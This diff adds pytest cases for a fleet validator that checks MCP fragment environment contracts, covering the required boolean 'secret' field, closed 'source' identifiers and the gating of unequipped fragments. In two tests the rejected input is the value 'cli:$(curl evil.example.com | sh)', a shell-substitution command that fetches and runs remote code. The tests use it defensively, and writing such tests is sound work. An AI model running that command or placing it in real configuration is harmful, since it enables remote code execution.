@@ -1561,3 +1561,189 @@ class TestGitCredentialsWarnings:
         monkeypatch.delenv("ORG_A_PAT", raising=False)
         warns = self._token_warnings(self._report(fleet_dir, monkeypatch, operator))
         assert any("ORG_A_PAT" in w and "403" in w for w in warns), warns
+
+
+class TestEnvContractShapeGate:
+    """#1214 Phase 1 — `secret` required, `source` closed at any tier.
+
+    Errors, not warnings: a var that silently defaults to not-a-secret is the
+    #1213 shape (a real credential nothing ever alerts on), and `generate`
+    refuses on errors so a malformed contract cannot compose.
+    """
+
+    def _write_contract(
+        self, fleet_dir: Path, contract: dict, *, name: str = "github"
+    ) -> None:
+        """Write the fragment. Deliberately does NOT equip it on any bot.
+
+        The gate is at library altitude, so a fragment nobody equips is still
+        checked — and the shared `fleet_dir` fixture declares no `mcp:` on any
+        bot, which makes every test here an unequipped case by default.
+        """
+        (fleet_dir / "library" / "mcp" / f"{name}.json").write_text(
+            json.dumps({name: {"command": "gh"}, "_env_contract": contract})
+        )
+
+    def _errors(self, fleet_dir: Path, monkeypatch) -> list[str]:
+        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
+        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
+        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
+        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
+        return validate(fleet, _make_paths(fleet_dir)).errors
+
+    def test_well_formed_contract_is_accepted(self, fleet_dir, monkeypatch):
+        """Positive control, and the absent-`source` case in one.
+
+        Every rejection test below is only meaningful if the accepting case
+        actually reaches the gate and passes it. Omitting `source` means a
+        human supplies the value — how all 27 declared vars behave today — so
+        this must never become an error."""
+        self._write_contract(
+            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": True}}
+        )
+        assert self._errors(fleet_dir, monkeypatch) == []
+
+    def test_missing_secret_is_rejected(self, fleet_dir, monkeypatch):
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("missing required 'secret'" in e for e in errors), errors
+        assert any("GITHUB_PAT" in e for e in errors), errors
+
+    def test_non_boolean_secret_is_rejected(self, fleet_dir, monkeypatch):
+        """`"secret": "true"` is the realistic typo and is truthy in Python —
+        so a bare truthiness read would accept it and silently label the var."""
+        self._write_contract(
+            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": "true"}}
+        )
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("must be a JSON boolean" in e for e in errors), errors
+
+    def test_secret_false_is_accepted_and_is_not_read_as_missing(
+        self, fleet_dir, monkeypatch
+    ):
+        """The both-directions control: `false` must pass the presence check.
+        A gate written as `if not meta.get("secret")` rejects this and would
+        make the config half of the contract undeclarable."""
+        self._write_contract(
+            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": False}}
+        )
+        assert self._errors(fleet_dir, monkeypatch) == []
+
+    def test_registered_sources_are_accepted(self, fleet_dir, monkeypatch):
+        for src in ("literal", "cli:gh-token", "mint:github-app"):
+            self._write_contract(
+                fleet_dir,
+                {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": src}},
+            )
+            assert self._errors(fleet_dir, monkeypatch) == [], src
+
+    def test_reserved_mint_source_parses_with_no_resolver_reading_it(
+        self, fleet_dir, monkeypatch
+    ):
+        """F1(a)'s stated mitigation: ship `cli` only, but prove the schema
+        against the harder class now so adding minting later is one arm rather
+        than a migration of every contract entry."""
+        self._write_contract(
+            fleet_dir,
+            {
+                "GITHUB_APP_KEY": {
+                    "tier": "fleet",
+                    "secret": True,
+                    "source": "mint:github-app",
+                }
+            },
+        )
+        assert self._errors(fleet_dir, monkeypatch) == []
+
+    def test_unregistered_source_is_rejected(self, fleet_dir, monkeypatch):
+        self._write_contract(
+            fleet_dir,
+            {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": "cli:curl"}},
+        )
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("unregistered source" in e for e in errors), errors
+
+    def test_a_source_carrying_a_command_is_rejected(self, fleet_dir, monkeypatch):
+        """The registry is closed on WHOLE identifiers, which is what makes
+        F5's injection guarantee structural. A kind-plus-free-parameter reading
+        would accept this and hand contract text to the resolver in command
+        position — including from a fleet-overlay fragment."""
+        self._write_contract(
+            fleet_dir,
+            {
+                "GITHUB_PAT": {
+                    "tier": "fleet",
+                    "secret": True,
+                    "source": "cli:$(curl evil.example.com | sh)",
+                }
+            },
+        )
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("unregistered source" in e for e in errors), errors
+
+
+    def test_an_unequipped_fragment_is_still_gated(self, fleet_dir, monkeypatch):
+        """The hole that moved this gate off the per-bot loop.
+
+        No bot equips `orphan`. Under the per-bot placement validate returned
+        clean with a shell-substitution `source` sitting in the library, so the
+        closed registry's guarantee held only for fragments someone happened to
+        equip.
+        """
+        self._write_contract(
+            fleet_dir,
+            {
+                "ORPHAN_TOKEN": {
+                    "tier": "fleet",
+                    "secret": True,
+                    "source": "cli:$(curl evil.example.com | sh)",
+                }
+            },
+            name="orphan",
+        )
+        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
+        assert all("orphan" not in [e.name for e in b.mcp] for b in fleet.bots.values())
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("unregistered source" in e and "orphan" in e for e in errors), errors
+
+    def test_one_defect_reports_once_however_many_bots_equip_it(
+        self, fleet_dir, monkeypatch
+    ):
+        """Per-bot, one missing `secret` on a widely-equipped fragment emitted
+        one identical error per bot — 21 lines for one typo on a 21-bot fleet,
+        each naming a bot when the fix is a one-line library edit."""
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        text = (fleet_dir / "fleet.yaml").read_text()
+        (fleet_dir / "fleet.yaml").write_text(
+            text.replace(
+                "expertise: [software-engineering]",
+                "expertise: [software-engineering]\n      mcp: [github]",
+            ).replace(
+                "expertise: [orchestration]",
+                "expertise: [orchestration]\n      mcp: [github]",
+            )
+        )
+        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
+        equipping = [b for b in fleet.bots.values() if [e.name for e in b.mcp]]
+        assert len(equipping) == 2, "fixture must have >1 bot equipping it"
+        errors = self._errors(fleet_dir, monkeypatch)
+        secret_errors = [e for e in errors if "missing required 'secret'" in e]
+        assert len(secret_errors) == 1, secret_errors
+
+    def test_error_names_the_file_not_a_bot(self, fleet_dir, monkeypatch):
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        (err,) = [
+            e for e in self._errors(fleet_dir, monkeypatch) if "'secret'" in e
+        ]
+        assert err.startswith("mcp fragment 'github.json'"), err
+        assert "bot '" not in err, err
+
+    def test_typo_in_a_registered_source_gets_a_suggestion(
+        self, fleet_dir, monkeypatch
+    ):
+        self._write_contract(
+            fleet_dir,
+            {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": "cli:gh_token"}},
+        )
+        errors = self._errors(fleet_dir, monkeypatch)
+        assert any("did you mean 'cli:gh-token'?" in e for e in errors), errors
